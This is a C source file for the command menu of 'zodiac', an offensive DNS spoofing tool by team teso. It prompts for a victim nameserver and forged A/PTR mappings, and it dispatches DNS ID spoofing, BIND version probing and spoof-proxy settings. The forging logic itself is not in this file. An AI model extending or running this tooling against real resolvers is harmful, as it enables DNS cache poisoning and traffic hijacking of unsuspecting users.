/* zodiac - advanced dns spoofer
 *
 * by team teso
 *
 * this routines are most likely the crappiest routines in the whole zodiac
 * source tree. if i have a lot of time i'll to a elite rewrite of this crap.
 * -sc
 */

#include <stdlib.h>
#include <string.h>
#include <ncurses.h>
#include "common.h"
#include "dns.h"
#include "dns-spoof.h"
#include "dns-tag.h"
#include "dns-tools.h"
#include "gui.h"
#include "output.h"
#include "zodiac.h"
#include "dns-build.h"


char	*input = NULL;
char	*prompt = NULL;


void
menu_prompt (char *pr)
{
	if (prompt == NULL) {
		prompt = xstrdup (pr);
	} else {
		free (prompt);
		prompt = xstrdup (pr);
	}
	m_printf (ms, ms->winsh, "%s", prompt);

	return;
}


void
menu_clear (void)
{
	if (input != NULL)
		free (input);
	input = NULL;
}


void
menu_tool (void)
{
}

void
menu_dos (void)
{
}


void
menu_spoof_jizz (void)
{
	char		*ns,
			*local_domain,
			*local_dns_ip,
			*spoof_from,
			*spoof_to;
	spoof_base	*base;

	ns = menu_input ();
	local_domain = menu_input ();
	local_dns_ip = menu_input ();
	spoof_from = menu_input ();
	spoof_to = menu_input ();
 
	base = spoof_jizz_new (ns, local_domain, local_dns_ip,
			spoof_from, spoof_to);
	spoof_do_threaded (base);
	return;
}

void
menu_spoof_local (void)
{
	char		*sp_type,
			*victim,
			*from, *to,
			*local_dns, *local_dns_ip;
	int		spoof_type;
	spoof_base	*base;

	victim = menu_input ();
	sp_type = menu_input ();
	if (strcasecmp (sp_type, "a") == 0) {
		spoof_type = T_A;
	} else if (strcasecmp (sp_type, "ptr") == 0) {
		spoof_type = T_PTR;
	} else {
		m_printf (ms, ms->winsh, "#! invalid spoof type\n");
		menu_clear ();
		return;
	}
	free (sp_type);

	from = menu_input ();
	to = menu_input ();
	local_dns = menu_input ();
	local_dns_ip = menu_input ();

	base = spoof_local_new (victim, from, to, local_dns, local_dns_ip,
				spoof_type);
	spoof_do_threaded (base);
	return;
}


void
menu_spoof_dnsid (void)
{
	char		*ns,
			*domain,
			*spoof_from,
			*spoof_to,
			*spoof_ptr,
			*sp_type;
	spoof_base	*base;
	int		n = 0,
			spoof_type;

	menu_prompt ("[victim nameserver] > ");
	ns = menu_input ();
	menu_prompt ("[your domain] > ");
	domain = menu_input ();

	base = spoof_id_new (ns, domain);

	menu_prompt ("[spoof from] > ");
	spoof_from = menu_input ();
	menu_prompt ("[spoof to] > ");
	spoof_to = menu_input ();
	if (inet_addr (spoof_to) == -1) {
		menu_prompt ("bad ip\n");
		menu_clear ();
		return;
	}
	menu_prompt ("[spoof type - a,ptr,both] ");
	sp_type = menu_input ();
	if (strcasecmp (sp_type, "a") == 0) {
		spoof_type = T_A;
	} else if (strcasecmp (sp_type, "ptr") == 0) {
		spoof_type = T_PTR;
	} else if (strcasecmp (sp_type, "both") == 0) {
		spoof_type = T_PTR + T_A;
	} else {
		m_printf (ms, ms->winsh, "#! invalid spoof type\n");
		menu_clear ();
		return;
	}
	free (sp_type);

	if (spoof_type == T_A) {
		n += spoof_id_add (base, T_A, spoof_from, spoof_to, NULL);
	} else if (spoof_type == T_PTR) {
		spoof_ptr = dns_build_ptr (spoof_to);
		n += spoof_id_add (base, T_PTR, spoof_ptr, spoof_from, NULL);
	} else {
		spoof_ptr = dns_build_ptr (spoof_to);
	        n += spoof_id_add (base, T_PTR, spoof_ptr, spoof_from, NULL);
		n += spoof_id_add (base, T_A, xstrdup (spoof_from), spoof_to, NULL);
	}

	if (n < 0) {
		menu_prompt ("error\n");
		menu_clear ();
		spoof_destroy (base);

		return;
	}

	spoof_do_threaded (base);

	return;
}


void
menu_set (void)
{
	char	*basecmd;

	menu_prompt ("[set] > ");
	basecmd = menu_input ();
	if (strcasecmp (basecmd, "zsp") == 0) {
		char	*tmp;

		tmp = zodiac_spoof_proxy;
		zodiac_spoof_proxy = NULL;
		if (tmp != NULL)
			free (tmp);
		tmp = zodiac_spoof_proxy_key;
		zodiac_spoof_proxy_key = NULL;
		if (tmp != NULL)
			free (tmp);

		zodiac_spoof_proxy = menu_input ();
		tmp = menu_input ();
		sscanf (tmp, "%hu", &zodiac_spoof_proxy_port);
		free (tmp);
		tmp = menu_input ();
		zodiac_spoof_proxy_key = xcalloc (1, strlen (tmp) + 1);
		sscanf (tmp, "%[^\n]\n", zodiac_spoof_proxy_key);
		free (tmp);
	} else if (strcasecmp (basecmd, "showpackets") == 0) {
		char	*tmp = menu_input ();

		sscanf (tmp, "%d", &dns_print_own_packets);
		free (tmp);
	} else {
		menu_clear ();
	}
	free (basecmd);

	return;
}


void
menu_ns (void)
{
	char	*basecmd;

	menu_prompt ("[ns] > ");
	basecmd = menu_input ();
	if (strcasecmp (basecmd, "version") == 0) {
		char	*ip;
		char	*version_reply;

		ip = menu_input ();
		version_reply = dt_bind_version (ip);
		m_printf (ms, ms->winsh, "%s: %s\n", ip, version_reply);

		free (ip);
		free (version_reply);
	} else {
		menu_clear ();
	}

	free (basecmd);

	return;
}


void
menu_test (void)
{
	char	*basecmd;

	menu_prompt ("[test] > ");
	basecmd = menu_input ();
	if (strcasecmp (basecmd, "spoof") == 0) {
		char	*ns,
			*ourdomain;
		int	spoofing = 0;

		ns = menu_input ();
		ourdomain = menu_input ();
		spoofing = spoof_ip_check (ns, ourdomain);
		m_printf (ms, ms->winsh, "[zod] send capabilities = %s\n",
			spoofing == 1 ? "spoofing allowed" :
			(spoofing == -1 ? "not even unspoofed packets" :
			"only unspoofed packets"));
		free (ns);
		free (ourdomain);
	}
	free (basecmd);

	return;
}


void
menu_spoof (void)
{
	char	*basecmd;

	menu_prompt ("[spoof] > ");
	basecmd = menu_input ();
	if (strcasecmp (basecmd, "local") == 0) {
		menu_spoof_local ();
	} else if (strcasecmp (basecmd, "jizz") == 0) {
		menu_spoof_jizz ();
	} else if (strcasecmp (basecmd, "id") == 0) {
		menu_spoof_dnsid ();
	} else {
		m_printf (ms, ms->winsh, "#! not a valid spoof subcommand\n");
		menu_clear ();
	}

	return;
}


void
menu_handle (void)
{
	char	*basecmd;

m_root:
	menu_prompt ("[] > ");

	do {
		basecmd = menu_input ();

		if (strlen (basecmd) == 0)
			goto m_root;

		/* lame code here
		 */
		if (strcasecmp (basecmd, "quit") == 0) {
			return;
		} else if (strcasecmp (basecmd, "help") == 0) {
			m_printf (ms, ms->winsh, "quit          quit zodiac\n");
			m_printf (ms, ms->winsh, "spoof id      dns id spoofing\n");
			m_printf (ms, ms->winsh, "ns version <host>                    bind version request\n");
			m_printf (ms, ms->winsh, "set zsp <host> <port> <key>          set spoof proxy parameters\n");
			m_printf (ms, ms->winsh, "set showpackets <1|0>                set show-own-packets flag\n");
			m_printf (ms, ms->winsh, "test spoof <nameserver> <ourdomain>  test whether we can ip spoof\n");
		} else if (strcasecmp (basecmd, "spoof") == 0) {
			menu_spoof ();
		} else if (strcasecmp (basecmd, "ns") == 0) {
			menu_ns ();
		} else if (strcasecmp (basecmd, "test") == 0) {
			menu_test ();
		} else if (strcasecmp (basecmd, "dos") == 0) {
//			menu_dos ();
		} else if (strcasecmp (basecmd, "set") == 0) {
			menu_set ();
		} else {
			m_printf (ms, ms->winsh, "#! wrong command, see \"help\"\n");
			goto m_root;
		}

		free (basecmd);
		basecmd = NULL;

	} while (1);
}


char *
menu_input (void)
{
	char	*p;
	int	cl;

	if (input == NULL) {
		input = xcalloc (1, 1024);
		wscanw (ms->winsh, "%1023c", input);
	}

	cl = strcspn (input, " \t\n\r");

	p = xcalloc (1, cl + 1);
	memcpy (p, input, cl);

	if (strlen (input + cl + 1) > 0) {
		int	n = strlen (input + cl + 1);

		memmove (input, input + cl + 1, strlen (input + cl + 1));
		memset (input + n, '\0', cl);
	} else {
		free (input);
		input = NULL;
	}

	return (p);
}



